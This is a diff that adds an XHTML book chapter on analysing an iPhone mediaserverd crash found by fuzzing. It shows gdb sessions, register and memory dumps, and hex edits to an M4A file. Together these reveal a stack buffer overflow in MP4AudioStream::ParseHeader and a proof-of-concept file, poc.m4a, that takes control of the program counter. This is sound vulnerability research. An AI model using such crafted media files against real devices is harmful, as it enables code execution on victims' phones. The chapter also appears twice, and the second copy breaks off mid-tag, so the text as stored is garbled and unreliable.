@@ -1,0 +1,302 @@
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml"><head><title>8.2 Crash Analysis and Exploitation</title><link rel="stylesheet" href="core.css" type="text/css"/><meta name="generator" content="DocBook XSL Stylesheets V1.74.0"/></head><body><div class="sect1" title="8.2 Crash Analysis and Exploitation"><div class="titlepage"><div><div><h1 class="title"><a id="crash_analysis_and_exploitation"/>8.2 Crash Analysis and Exploitation</h1></div></div></div><p>After the fuzzer had finished processing the test cases, I searched the access logfile of the web server for “<code class="literal">BUG_FOUND</code>” entries.</p><a id="I_programlisting8_d1e9164"/><pre class="programlisting">linux$ <strong class="userinput"><code>grep BUG /var/log/apache2/access.log</code></strong>
+192.168.99.103 .. "GET /<strong class="userinput"><code>BUG_FOUND_file40.m4a</code></strong>
+ HTTP/1.1" 404 277 "-" "Mozilla/5.0 (iPhone; U; CPU iPhone OS 2_2_1 like Mac OS X;
+ en-us) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1
+ Mobile/5H11 Safari/525.20"
+192.168.99.103 .. "GET /<strong class="userinput"><code>BUG_FOUND_file41.m4a</code></strong> HTTP/1.1"
+ 404 276 "-" "Mozilla/5.0 (iPhone; U; CPU iPhone OS 2_2_1 like Mac OS X; en-us)
+ AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5H11 Safari/525.20"
+192.168.99.103 .. "GET /<strong class="userinput"><code>BUG_FOUND_file42.m4a</code></strong> HTTP/1.1"
+ 404 277 "-" "Mozilla/5.0 (iPhone; U; CPU iPhone OS 2_2_1 like Mac OS X; en-us)
+ AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5H11 Safari/525.20"
+[..]</pre><p>As shown in the excerpt of the logfile, <code class="literal">mediaserverd</code> encountered a fault while attempting to play the test-case files 40, 41, and 42. To analyze the crashes, I rebooted the phone and attached the GNU debugger (see Section B.4) to <code class="literal">mediaserverd</code>:</p><div class="note" title="Note"><h3 class="title">Note</h3><p><span class="emphasis"><em>The iPhone, like most mobile devices, uses an ARM CPU. This is important because the ARM assembly language is vastly different from Intel assembly</em></span>.<a id="IDX-CHP-8-0019" class="indexterm"/><a id="IDX-CHP-8-0020" class="indexterm"/></p></div><a id="I_programlisting8_d1e9199"/><pre class="programlisting">iphone# <strong class="userinput"><code>uname -a</code></strong>
+Darwin localhost 9.4.1 Darwin Kernel Version 9.4.1: Mon Dec
+  8 20:59:30 PST 2008; root:xnu-1228.7.37~4/RELEASE_ARM_S5L8900X
+ iPhone1,1 arm M68AP Darwin
+
+iphone# <strong class="userinput"><code>id</code></strong>
+uid=0(root) gid=0(wheel)
+
+iphone# <strong class="userinput"><code>gdb -q</code></strong></pre><p>After I started gdb, I used the following command to retrieve the current process ID of <code class="literal">mediaserverd</code>:</p><a id="I_programlisting8_d1e9214"/><pre class="programlisting">(gdb) <strong class="userinput"><code>shell ps -u mobile -O pid | grep mediaserverd</code></strong>
+   27   ??  Ss     0:01.63 /usr/sbin/mediaserverd</pre><p>I then loaded the <code class="literal">mediaserverd</code> binary into the debugger and attached it to the process:</p><a id="I_programlisting8_d1e9224"/><pre class="programlisting">(gdb) <strong class="userinput"><code>exec-file /usr/sbin/mediaserverd</code></strong>
+Reading symbols for shared libraries ......... done
+
+(gdb) <strong class="userinput"><code>attach 27</code></strong>
+Attaching to program: `/usr/sbin/mediaserverd', process 27.
+Reading symbols for shared libraries ..................................... done
+0x3146baa4 in mach_msg_trap ()</pre><p>Before I continued the execution of <code class="literal">mediaserverd</code>, I used the <code class="literal">follow-fork-mode</code> command to instruct the debugger to follow the child process instead of the parent process:</p><a id="I_programlisting8_d1e9241"/><pre class="programlisting">(gdb) <strong class="userinput"><code>set follow-fork-mode child</code></strong>
+
+(gdb) <strong class="userinput"><code>continue</code></strong>
+Continuing.</pre><p>I opened MobileSafari on the phone and pointed it to the URL of test-case file number 40 (<span class="emphasis"><em>file40.m4a</em></span>). The debugger produced the following result:</p><a id="I_programlisting8_d1e9254"/><pre class="programlisting">Program received signal EXC_BAD_ACCESS, Could not access memory.
+Reason: KERN_PROTECTION_FAILURE at address: 0x01302000
+[Switching to process 27 thread 0xa10b]
+0x314780ec in memmove ()</pre><p>The crash occurred when <code class="literal">mediaserverd</code> tried to access memory at address <code class="literal">0x01302000</code>.</p><a id="I_programlisting8_d1e9264"/><pre class="programlisting">(gdb) <strong class="userinput"><code>x/1x 0x01302000</code></strong>
+0x1302000:      Cannot access memory at address 0x1302000</pre><p>As the debugger output shows, <code class="literal">mediaserverd</code> crashed while trying to reference an unmapped memory location. To further analyze the crash, I printed the current call stack:<a id="IDX-CHP-8-0021" class="indexterm"/></p><a id="I_programlisting8_d1e9277"/><pre class="programlisting">(gdb) <strong class="userinput"><code>backtrace</code></strong>
+#0  0x314780ec in memmove ()
+#1  0x3493d5e0 in MP4AudioStream::ParseHeader ()
+<strong class="userinput"><code>#2  0x00000072 in ?? ()</code></strong>
+Cannot access memory at address 0x72</pre><p>This output was intriguing. The address of stack frame #2 had an unusual value (<code class="literal">0x00000072</code>), which seemed to indicate that the stack had become corrupted. I used the following command to print the last instruction that was executed in <code class="literal">MP4AudioStream::ParseHeader()</code> (see stack frame #1):</p><a id="I_programlisting8_d1e9293"/><pre class="programlisting">(gdb) <strong class="userinput"><code>x/1i 0x3493d5e0 - 4</code></strong>
+0x3493d5dc &lt;_ZN14MP4AudioStream11ParseHeaderER27AudioFileStream
+Continuation+1652&gt;:      bl      0x34997374 &lt;dyld_stub_memcpy&gt;</pre><p>The last instruction executed in <code class="literal">MP4AudioStream::ParseHeader()</code> was a call to <code class="literal">memcpy()</code>, which must have caused the crash. At this time, the bug had exhibited all the characteristics of a stack buffer overflow vulnerability (see Section A.1).<a id="IDX-CHP-8-0022" class="indexterm"/></p><p>I stopped the debugging session and rebooted the device. After the phone started, I attached the debugger to <code class="literal">mediaserverd</code> again, and this time I also defined a breakpoint at the <code class="literal">memcpy()</code> call in <code class="literal">MP4AudioStream::ParseHeader()</code> in order to evaluate the function arguments supplied to <code class="literal">memcpy()</code>:</p><a id="I_programlisting8_d1e9324"/><pre class="programlisting">(gdb) <strong class="userinput"><code>break *0x3493d5dc</code></strong>
+Breakpoint 1 at 0x3493d5dc
+
+(gdb) <strong class="userinput"><code>continue</code></strong>
+Continuing.</pre><p>I opened test case number 40 (<span class="emphasis"><em>file40.m4a</em></span>) in MobileSafari in order to trigger the breakpoint:</p><a id="I_programlisting8_d1e9337"/><pre class="programlisting">[Switching to process 27 thread 0x9c0b]
+
+Breakpoint 1, 0x3493d5dc in MP4AudioStream::ParseHeader ()</pre><p>The arguments of <code class="literal">memcpy()</code> are usually stored in the registers <code class="literal">r0</code> (destination buffer), <code class="literal">r1</code> (source buffer), and <code class="literal">r2</code> (bytes to copy). I asked the debugger for the current values of those registers.</p><a id="I_programlisting8_d1e9353"/><pre class="programlisting">(gdb) <strong class="userinput"><code>info registers r0 r1 r2</code></strong>
+r0             0x684a38 6834744
+r1             0x115030 1134640
+r2             0x1fd0   8144</pre><p>I also inspected the data pointed to by <code class="literal">r1</code> to see if the source data of <code class="literal">memcpy()</code> was user controllable:</p><a id="I_programlisting8_d1e9366"/><pre class="programlisting">(gdb) <strong class="userinput"><code>x/40x $r1</code></strong>
+0x115030:       0x00000000      0xd7e178c2      0xe5e178c2      0x80bb0000
+0x115040:       0x00b41000      0x00000100      0x00000001      0x00000000
+0x115050:       0x00000000      0x00000100      0x00000000      0x00000000
+0x115060:       0x00000000      0x00000100      0x00000000      0x00000000
+0x115070:       0x00000000      0x00000040      0x00000000      0x00000000
+0x115080:       0x00000000      0x00000000      0x00000000      0x00000000
+0x115090:       0x02000000      0x2d130000      0x6b617274      0x5c000000
+0x1150a0:       0x64686b74      0x07000000      0xd7e178c2      0xe5e178c2
+0x1150b0:       0x01000000      0x00000000      0x00b41000      0x00000000
+0x1150c0:       0x00000000      0x00000000      0x00000001      0x00000100</pre><p>I then searched test-case file number 40 for those values. I found them right at the beginning of the file in little-endian notation:<a id="IDX-CHP-8-0023" class="indexterm"/></p><a id="I_programlisting8_d1e9376"/><pre class="programlisting">[..]
+00000030h: 00 00 00 00 C2 78 E1 D7 C2 78 E1 E5 00 00 BB 80 ; ....Âxá×Âxáå..»₠
+00000040h: 00 10 B4 00 00 01 00 00 01 00 00 00 00 00 00 00 ; ..'.............
+00000050h: 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 ; ................
+00000060h: 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 ; ................
+00000070h: 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00 ; ....@...........
+[..]</pre><p>So I could control the source data of the memory copy. I continued the execution of <code class="literal">mediaserverd</code> and got the following output in the debugger:</p><a id="I_programlisting8_d1e9383"/><pre class="programlisting">(gdb) <strong class="userinput"><code>continue</code></strong>
+Continuing.
+
+Program received signal EXC_BAD_ACCESS, Could not access memory.
+Reason: KERN_PROTECTION_FAILURE at address: 0x00685000
+0x314780ec in memmove ()</pre><p><code class="literal">Mediaserverd</code> crashed again while trying to access unmapped memory. It seemed that the size argument supplied to <code class="literal">memcpy()</code> was too big, so the function tried to copy audio-file data beyond the end of the stack. At this point I stopped the debugger and opened the test-case file that had actually caused the crash (<span class="emphasis"><em>file40.m4a</em></span>) with a hex editor:</p><a id="I_programlisting8_d1e9399"/><pre class="programlisting">00000000h: 00 00 00 20 66 74 79 70 4D 34 41 20 00 00 00 00 ; ... ftypM4A ....
+00000010h: 4D 34 41 20 6D 70 34 32 69 73 6F 6D 00 00 00 00 ; M4A mp42isom....
+00000020h: 00 00 1C 65 6D 6F 6F 76 <span class="underline">FF</span> 00 00 6C <span class="underline">6D 76 68 64</span> ; ...emoovÿ..lmvhd
+[..]</pre><p>The manipulated byte (<code class="literal">0xff</code>) that caused the crash can be found at file offset 40 (<code class="literal">0x28</code>). I consulted the <span class="emphasis"><em>QuickTime File Format Specification</em></span><sup>[<a href="ch08s05.html#ftn.CHP-8-FN-7" class="footnoteref">88</a>]</sup> to determine the role of that byte within the file structure. The byte was described as part of the atom size of a <span class="emphasis"><em>movie header atom</em></span>, so the fuzzer must have changed the size value of that atom. As I mentioned before, the size supplied to <code class="literal">memcpy()</code> was too big, so <code class="literal">mediaserverd</code> had crashed while trying to copy too much data onto the stack. To avoid the crash, I set the atom size to a smaller value. I changed the manipulated value at file offset 40 back to <code class="literal">0x00</code> and the byte value at offset 42 to <code class="literal">0x02</code>. I named the new file <span class="emphasis"><em>file40_2.m4a</em></span>.<a id="IDX-CHP-8-0024" class="indexterm"/><a id="IDX-CHP-8-0025" class="indexterm"/></p><p>Here is the original test-case file 40 (<span class="emphasis"><em>file40.m4a</em></span>):</p><a id="I_programlisting8_d1e9449"/><pre class="programlisting">00000020h: 00 00 1C 65 6D 6F 6F 76 <span class="underline">FF</span> 00 <span class="underline">00</span> 6C 6D 76 68 64 ; ...emoovÿ..lmvhd</pre><p>And here is the new test-case file (<span class="emphasis"><em>file40_2.m4a</em></span>) with changes underlined:</p><a id="I_programlisting8_d1e9462"/><pre class="programlisting">00000020h: 00 00 1C 65 6D 6F 6F 76 <span class="underline">00</span> 00 <span class="underline">02</span> 6C 6D 76 68 64 ; ...emoovÿ..lmvhd</pre><p>I rebooted the device to get a clean environment, attached the debugger to <code class="literal">mediaserverd</code> again, and opened the new file in MobileSafari.</p><a id="I_programlisting8_d1e9475"/><pre class="programlisting">Program received signal EXC_BAD_ACCESS, Could not access memory.
+Reason: KERN_PROTECTION_FAILURE at address: 0x00000072
+[Switching to process 27 thread 0xa10b]
+0x00000072 in ?? ()</pre><p>This time the program counter (instruction pointer) was manipulated to point to address <code class="literal">0x00000072</code>. I then stopped the debugging session and started a new one while again setting a breakpoint at the <code class="literal">memcpy()</code> call in <code class="literal">MP4AudioStream::ParseHeader()</code>:</p><a id="I_programlisting8_d1e9488"/><pre class="programlisting">(gdb) <strong class="userinput"><code>break *0x3493d5dc</code></strong>
+Breakpoint 1 at 0x3493d5dc
+
+(gdb) <strong class="userinput"><code>continue</code></strong>
+Continuing.</pre><p>When I opened the modified test-case file <span class="emphasis"><em>file40_2.m4a</em></span> in MobileSafari, I got the following output in the debugger:</p><a id="I_programlisting8_d1e9502"/><pre class="programlisting">[Switching to process 71 thread 0x9f07]
+
+Breakpoint 1, 0x3493d5dc in MP4AudioStream::ParseHeader ()</pre><p>I printed the current call stack:</p><a id="I_programlisting8_d1e9506"/><pre class="programlisting"><strong class="userinput"><code>(gdb) backtrace</code></strong>
+<strong class="userinput"><code>#0  0x3493d5dc in MP4AudioStream::ParseHeader ()</code></strong>
+#1  0x3490d748 in AudioFileStreamWrapper::ParseBytes ()
+#2  0x3490cfa8 in AudioFileStreamParseBytes ()
+#3  0x345dad70 in PushBytesThroughParser ()
+#4  0x345dbd3c in FigAudioFileStreamFormatReaderCreateFromStream ()
+#5  0x345dff08 in instantiateFormatReader ()
+#6  0x345e02c4 in FigFormatReaderCreateForStream ()
+#7  0x345d293c in itemfig_assureBasicsReadyForInspectionInternal ()
+#8  0x345d945c in itemfig_makeReadyForInspectionThread ()
+#9  0x3146178c in _pthread_body ()
+#10 0x00000000 in ?? ()</pre><p>The first stack frame on the list was the one I was looking for. I used the following command to display information about the current stack frame of <code class="literal">MP4AudioStream::ParseHeader()</code>:</p><a id="I_programlisting8_d1e9518"/><pre class="programlisting">(gdb) <strong class="userinput"><code>info frame 0</code></strong>
+Stack frame at 0x1301c00:
+ pc = 0x3493d5dc in MP4AudioStream::ParseHeader(AudioFileStream
+Continuation&amp;); saved pc 0x3490d748
+ called by frame at 0x1301c30
+ Arglist at 0x1301bf8, args:
+ Locals at 0x1301bf8, Saved registers:
+  r4 at 0x1301bec, r5 at 0x1301bf0, r6 at 0x1301bf4, r7
+ at 0x1301bf8, r8 at                                   → 0x1301be0, sl at
+ 0x1301be4, fp at 0x1301be8, lr at 0x1301bfc, <strong class="userinput"><code>pc at 0x1301bfc</code></strong>,
+  s16 at 0x1301ba0, s17 at 0x1301ba4, s18 at 0x1301ba8, s19 at
+ 0x1301bac, s20 at                    → 0x1301bb0, s21 at 0x1301bb4,
+ s22 at 0x1301bb8, s23 at 0x1301bbc,
+  s24 at 0x1301bc0, s25 at 0x1301bc4, s26 at 0x1301bc8, s27 at
+ 0x1301bcc, s28 at                    → 0x1301bd0, s29 at 0x1301bd4,
+ s30 at 0x1301bd8, s31 at 0x1301bdc</pre><p>The most interesting information was the memory location where the program counter (<code class="literal">pc</code> register) was stored on the stack. As the debugger output shows, <code class="literal">pc</code> was saved at address <code class="literal">0x1301bfc</code> on the stack (see “<code class="literal">Saved registers</code>”).</p><p>I then continued the execution of the process:</p><a id="I_programlisting8_d1e9542"/><pre class="programlisting">(gdb) <strong class="userinput"><code>continue</code></strong>
+Continuing.
+
+Program received signal EXC_BAD_ACCESS, Could not access memory.
+Reason: KERN_PROTECTION_FAILURE at address: 0x00000072
+0x00000072 in ?? ()</pre><p>After the crash, I looked at the stack location (memory address <code class="literal">0x1301bfc</code>) where the <code class="literal">MP4AudioStream::ParseHeader()</code> function expects to find its saved program counter.</p><a id="I_programlisting8_d1e9555"/><pre class="programlisting">(gdb) <strong class="userinput"><code>x/12x 0x1301bfc</code></strong>
+0x1301bfc:      0x00000073      0x00000000      0x04000001      0x0400002d
+0x1301c0c:      0x00000000      0x73747328      0x00000063      0x00000000
+0x1301c1c:      0x00000002      0x00000001      0x00000017      0x00000001</pre><p>The debugger output shows that the saved instruction pointer was overwritten with the value <code class="literal">0x00000073</code>. When the function tried to return to its caller function, the manipulated value was assigned to the instruction pointer (<code class="literal">pc</code> register). Specifically, the value <code class="literal">0x00000072</code> was copied into the instruction pointer instead of the file value <code class="literal">0x00000073</code> due to the instruction alignment of the ARM CPU (instruction alignment on a 16-bit or 32-bit boundary).<a id="IDX-CHP-8-0026" class="indexterm"/><a id="IDX-CHP-8-0027" class="indexterm"/></p><p>My extremely simple fuzzer had indeed found a classic stack buffer overflow in the audio libraries of the iPhone. I searched the test-case file for the byte pattern of the debugger output and found the byte sequence at file offset 500 in <span class="emphasis"><em>file40_2.m4a</em></span>:</p><a id="I_programlisting8_d1e9586"/><pre class="programlisting">000001f0h: 18 73 74 74 <span class="underline">73 00 00 00</span> 00 00 00 00 01 00 00 04 ; .stts...........
+00000200h: 2D 00 00 04 00 00 00 00 28 73 74 73 63 00 00 00 ; -.......(stsc...
+00000210h: 00 00 00 00 02 00 00 00 01 00 00 00 17 00 00 00 ; ................</pre><p>I then changed the underlined value above to <code class="literal">0x44444444</code> and named the new file <span class="emphasis"><em>poc.m4a</em></span>:</p><a id="I_programlisting8_d1e9599"/><pre class="programlisting">000001f0h: 18 73 74 74 <span class="underline">44 44 44 44</span> 00 00 00 00 01 00 00 04 ; .sttDDDD.........
+00000200h: 2D 00 00 04 00 00 00 00 28 73 74 73 63 00 00 00 ; -.......(stsc...
+00000210h: 00 00 00 00 02 00 00 00 01 00 00 00 17 00 00 00 ; ................</pre><p>I attached the debugger to <code class="literal">mediaserverd</code> again and opened the new <span class="emphasis"><em>poc.m4a</em></span> file in MobileSafari, which resulted in the following debugger output:</p><a id="I_programlisting8_d1e9612"/><pre class="programlisting">Program received signal EXC_BAD_ACCESS, Could not access memory.
+Reason: KERN_INVALID_ADDRESS at address: 0x44444444
+[Switching to process 77 thread 0xa20f]
+<strong class="userinput"><code>0x44444444 in ?? ()</code></strong>
+
+(gdb) <strong class="userinput"><code>info registers</code></strong>
+r0             0x6474613f       1685348671
+r1             0x393fc284       960479876
+r2             0xcb0            3248
+r3             0x10b            267
+r4             0x6901102        110104834
+r5             0x1808080        25198720
+r6             0x2              2
+r7             0x74747318       1953788696
+r8             0xf40100         15991040
+r9             0x817a00         8485376
+sl             0xf40100         15991040
+fp             0x80808005      −2139062267
+ip             0x20044          131140
+sp             0x684c00         6835200
+lr             0x1f310          127760
+<strong class="userinput"><code>pc             0x44444444</code></strong>       1145324612
+cpsr           {0x60000010, n = 0x0, z = 0x1, c = 0x1, v = 0x0,
+ q = 0x0, j = 0x0, ge = 0x0, e = 0x0, a = 0x0, i = 0x0, f = 0x0, t = 0x0,
+ mode = 0x10}   {0x60000010, n = 0, z = 1, c = 1, v = 0, q = 0, j = 0, ge = 0,
+ e = 0, a = 0, i = 0, f = 0, t = 0, mode = usr}
+
+<strong class="userinput"><code>(gdb) backtrace</code></strong>
+<strong class="userinput"><code>#0  0x44444444 in ?? ()</code></strong>
+Cannot access memory at address 0x74747318</pre><p>Yay! At this point I had full control over the program counter.<a id="IDX-CHP-8-0028" class="indexterm"/></p></div></body></html>
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml"><head><title>8.2 Crash Analysis and Exploitation</title><link rel="stylesheet" href="core.css" type="text/css"/><meta name="generator" content="DocBook XSL Stylesheets V1.74.0"/></head><body><div class="sect1" title="8.2 Crash Analysis and Exploitation"><div class="titlepage"><div><div><h1 class="title"><a id="crash_analysis_and_exploitation"/>8.2 Crash Analysis and Exploitation</h1></div></div></div><p>After the fuzzer had finished processing the test cases, I searched the access logfile of the web server for “<code class="literal">BUG_FOUND</code>” entries.</p><a id="I_programlisting8_d1e9164"/><pre class="programlisting">linux$ <strong class="userinput"><code>grep BUG /var/log/apache2/access.log</code></strong>
+192.168.99.103 .. "GET /<strong class="userinput"><code>BUG_FOUND_file40.m4a</code></strong>
+ HTTP/1.1" 404 277 "-" "Mozilla/5.0 (iPhone; U; CPU iPhone OS 2_2_1 like Mac OS X;
+ en-us) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1
+ Mobile/5H11 Safari/525.20"
+192.168.99.103 .. "GET /<strong class="userinput"><code>BUG_FOUND_file41.m4a</code></strong> HTTP/1.1"
+ 404 276 "-" "Mozilla/5.0 (iPhone; U; CPU iPhone OS 2_2_1 like Mac OS X; en-us)
+ AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5H11 Safari/525.20"
+192.168.99.103 .. "GET /<strong class="userinput"><code>BUG_FOUND_file42.m4a</code></strong> HTTP/1.1"
+ 404 277 "-" "Mozilla/5.0 (iPhone; U; CPU iPhone OS 2_2_1 like Mac OS X; en-us)
+ AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5H11 Safari/525.20"
+[..]</pre><p>As shown in the excerpt of the logfile, <code class="literal">mediaserverd</code> encountered a fault while attempting to play the test-case files 40, 41, and 42. To analyze the crashes, I rebooted the phone and attached the GNU debugger (see Section B.4) to <code class="literal">mediaserverd</code>:</p><div class="note" title="Note"><h3 class="title">Note</h3><p><span class="emphasis"><em>The iPhone, like most mobile devices, uses an ARM CPU. This is important because the ARM assembly language is vastly different from Intel assembly</em></span>.<a id="IDX-CHP-8-0019" class="indexterm"/><a id="IDX-CHP-8-0020" class="indexterm"/></p></div><a id="I_programlisting8_d1e9199"/><pre class="programlisting">iphone# <strong class="userinput"><code>uname -a</code></strong>
+Darwin localhost 9.4.1 Darwin Kernel Version 9.4.1: Mon Dec
+  8 20:59:30 PST 2008; root:xnu-1228.7.37~4/RELEASE_ARM_S5L8900X
+ iPhone1,1 arm M68AP Darwin
+
+iphone# <strong class="userinput"><code>id</code></strong>
+uid=0(root) gid=0(wheel)
+
+iphone# <strong class="userinput"><code>gdb -q</code></strong></pre><p>After I started gdb, I used the following command to retrieve the current process ID of <code class="literal">mediaserverd</code>:</p><a id="I_programlisting8_d1e9214"/><pre class="programlisting">(gdb) <strong class="userinput"><code>shell ps -u mobile -O pid | grep mediaserverd</code></strong>
+   27   ??  Ss     0:01.63 /usr/sbin/mediaserverd</pre><p>I then loaded the <code class="literal">mediaserverd</code> binary into the debugger and attached it to the process:</p><a id="I_programlisting8_d1e9224"/><pre class="programlisting">(gdb) <strong class="userinput"><code>exec-file /usr/sbin/mediaserverd</code></strong>
+Reading symbols for shared libraries ......... done
+
+(gdb) <strong class="userinput"><code>attach 27</code></strong>
+Attaching to program: `/usr/sbin/mediaserverd', process 27.
+Reading symbols for shared libraries ..................................... done
+0x3146baa4 in mach_msg_trap ()</pre><p>Before I continued the execution of <code class="literal">mediaserverd</code>, I used the <code class="literal">follow-fork-mode</code> command to instruct the debugger to follow the child process instead of the parent process:</p><a id="I_programlisting8_d1e9241"/><pre class="programlisting">(gdb) <strong class="userinput"><code>set follow-fork-mode child</code></strong>
+
+(gdb) <strong class="userinput"><code>continue</code></strong>
+Continuing.</pre><p>I opened MobileSafari on the phone and pointed it to the URL of test-case file number 40 (<span class="emphasis"><em>file40.m4a</em></span>). The debugger produced the following result:</p><a id="I_programlisting8_d1e9254"/><pre class="programlisting">Program received signal EXC_BAD_ACCESS, Could not access memory.
+Reason: KERN_PROTECTION_FAILURE at address: 0x01302000
+[Switching to process 27 thread 0xa10b]
+0x314780ec in memmove ()</pre><p>The crash occurred when <code class="literal">mediaserverd</code> tried to access memory at address <code class="literal">0x01302000</code>.</p><a id="I_programlisting8_d1e9264"/><pre class="programlisting">(gdb) <strong class="userinput"><code>x/1x 0x01302000</code></strong>
+0x1302000:      Cannot access memory at address 0x1302000</pre><p>As the debugger output shows, <code class="literal">mediaserverd</code> crashed while trying to reference an unmapped memory location. To further analyze the crash, I printed the current call stack:<a id="IDX-CHP-8-0021" class="indexterm"/></p><a id="I_programlisting8_d1e9277"/><pre class="programlisting">(gdb) <strong class="userinput"><code>backtrace</code></strong>
+#0  0x314780ec in memmove ()
+#1  0x3493d5e0 in MP4AudioStream::ParseHeader ()
+<strong class="userinput"><code>#2  0x00000072 in ?? ()</code></strong>
+Cannot access memory at address 0x72</pre><p>This output was intriguing. The address of stack frame #2 had an unusual value (<code class="literal">0x00000072</code>), which seemed to indicate that the stack had become corrupted. I used the following command to print the last instruction that was executed in <code class="literal">MP4AudioStream::ParseHeader()</code> (see stack frame #1):</p><a id="I_programlisting8_d1e9293"/><pre class="programlisting">(gdb) <strong class="userinput"><code>x/1i 0x3493d5e0 - 4</code></strong>
+0x3493d5dc &lt;_ZN14MP4AudioStream11ParseHeaderER27AudioFileStream
+Continuation+1652&gt;:      bl      0x34997374 &lt;dyld_stub_memcpy&gt;</pre><p>The last instruction executed in <code class="literal">MP4AudioStream::ParseHeader()</code> was a call to <code class="literal">memcpy()</code>, which must have caused the crash. At this time, the bug had exhibited all the characteristics of a stack buffer overflow vulnerability (see Section A.1).<a id="IDX-CHP-8-0022" class="indexterm"/></p><p>I stopped the debugging session and rebooted the device. After the phone started, I attached the debugger to <code class="literal">mediaserverd</code> again, and this time I also defined a breakpoint at the <code class="literal">memcpy()</code> call in <code class="literal">MP4AudioStream::ParseHeader()</code> in order to evaluate the function arguments supplied to <code class="literal">memcpy()</code>:</p><a id="I_programlisting8_d1e9324"/><pre class="programlisting">(gdb) <strong class="userinput"><code>break *0x3493d5dc</code></strong>
+Breakpoint 1 at 0x3493d5dc
+
+(gdb) <strong class="userinput"><code>continue</code></strong>
+Continuing.</pre><p>I opened test case number 40 (<span class="emphasis"><em>file40.m4a</em></span>) in MobileSafari in order to trigger the breakpoint:</p><a id="I_programlisting8_d1e9337"/><pre class="programlisting">[Switching to process 27 thread 0x9c0b]
+
+Breakpoint 1, 0x3493d5dc in MP4AudioStream::ParseHeader ()</pre><p>The arguments of <code class="literal">memcpy()</code> are usually stored in the registers <code class="literal">r0</code> (destination buffer), <code class="literal">r1</code> (source buffer), and <code class="literal">r2</code> (bytes to copy). I asked the debugger for the current values of those registers.</p><a id="I_programlisting8_d1e9353"/><pre class="programlisting">(gdb) <strong class="userinput"><code>info registers r0 r1 r2</code></strong>
+r0             0x684a38 6834744
+r1             0x115030 1134640
+r2             0x1fd0   8144</pre><p>I also inspected the data pointed to by <code class="literal">r1</code> to see if the source data of <code class="literal">memcpy()</code> was user controllable:</p><a id="I_programlisting8_d1e9366"/><pre class="programlisting">(gdb) <strong class="userinput"><code>x/40x $r1</code></strong>
+0x115030:       0x00000000      0xd7e178c2      0xe5e178c2      0x80bb0000
+0x115040:       0x00b41000      0x00000100      0x00000001      0x00000000
+0x115050:       0x00000000      0x00000100      0x00000000      0x00000000
+0x115060:       0x00000000      0x00000100      0x00000000      0x00000000
+0x115070:       0x00000000      0x00000040      0x00000000      0x00000000
+0x115080:       0x00000000      0x00000000      0x00000000      0x00000000
+0x115090:       0x02000000      0x2d130000      0x6b617274      0x5c000000
+0x1150a0:       0x64686b74      0x07000000      0xd7e178c2      0xe5e178c2
+0x1150b0:       0x01000000      0x00000000      0x00b41000      0x00000000
+0x1150c0:       0x00000000      0x00000000      0x00000001      0x00000100</pre><p>I then searched test-case file number 40 for those values. I found them right at the beginning of the file in little-endian notation:<a id="IDX-CHP-8-0023" class="indexterm"/></p><a id="I_programlisting8_d1e9376"/><pre class="programlisting">[..]
+00000030h: 00 00 00 00 C2 78 E1 D7 C2 78 E1 E5 00 00 BB 80 ; ....Âxá×Âxáå..»₠
+00000040h: 00 10 B4 00 00 01 00 00 01 00 00 00 00 00 00 00 ; ..'.............
+00000050h: 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 ; ................
+00000060h: 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 ; ................
+00000070h: 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00 ; ....@...........
+[..]</pre><p>So I could control the source data of the memory copy. I continued the execution of <code class="literal">mediaserverd</code> and got the following output in the debugger:</p><a id="I_programlisting8_d1e9383"/><pre class="programlisting">(gdb) <strong class="userinput"><code>continue</code></strong>
+Continuing.
+
+Program received signal EXC_BAD_ACCESS, Could not access memory.
+Reason: KERN_PROTECTION_FAILURE at address: 0x00685000
+0x314780ec in memmove ()</pre><p><code class="literal">Mediaserverd</code> crashed again while trying to access unmapped memory. It seemed that the size argument supplied to <code class="literal">memcpy()</code> was too big, so the function tried to copy audio-file data beyond the end of the stack. At this point I stopped the debugger and opened the test-case file that had actually caused the crash (<span class="emphasis"><em>file40.m4a</em></span>) with a hex editor:</p><a id="I_programlisting8_d1e9399"/><pre class="programlisting">00000000h: 00 00 00 20 66 74 79 70 4D 34 41 20 00 00 00 00 ; ... ftypM4A ....
+00000010h: 4D 34 41 20 6D 70 34 32 69 73 6F 6D 00 00 00 00 ; M4A mp42isom....
+00000020h: 00 00 1C 65 6D 6F 6F 76 <span class="underline">FF</span> 00 00 6C <span class="underline">6D 76 68 64</span> ; ...emoovÿ..lmvhd
+[..]</pre><p>The manipulated byte (<code class="literal">0xff</code>) that caused the crash can be found at file offset 40 (<code class="literal">0x28</code>). I consulted the <span class="emphasis"><em>QuickTime File Format Specification</em></span><sup>[<a href="ch08s05.html#ftn.CHP-8-FN-7" class="footnoteref">88</a>]</sup> to determine the role of that byte within the file structure. The byte was described as part of the atom size of a <span class="emphasis"><em>movie header atom</em></span>, so the fuzzer must have changed the size value of that atom. As I mentioned before, the size supplied to <code class="literal">memcpy()</code> was too big, so <code class="literal">mediaserverd</code> had crashed while trying to copy too much data onto the stack. To avoid the crash, I set the atom size to a smaller value. I changed the manipulated value at file offset 40 back to <code class="literal">0x00</code> and the byte value at offset 42 to <code class="literal">0x02</code>. I named the new file <span class="emphasis"><em>file40_2.m4a</em></span>.<a id="IDX-CHP-8-0024" class="indexterm"/><a id="IDX-CHP-8-0025" class="indexterm"/></p><p>Here is the original test-case file 40 (<span 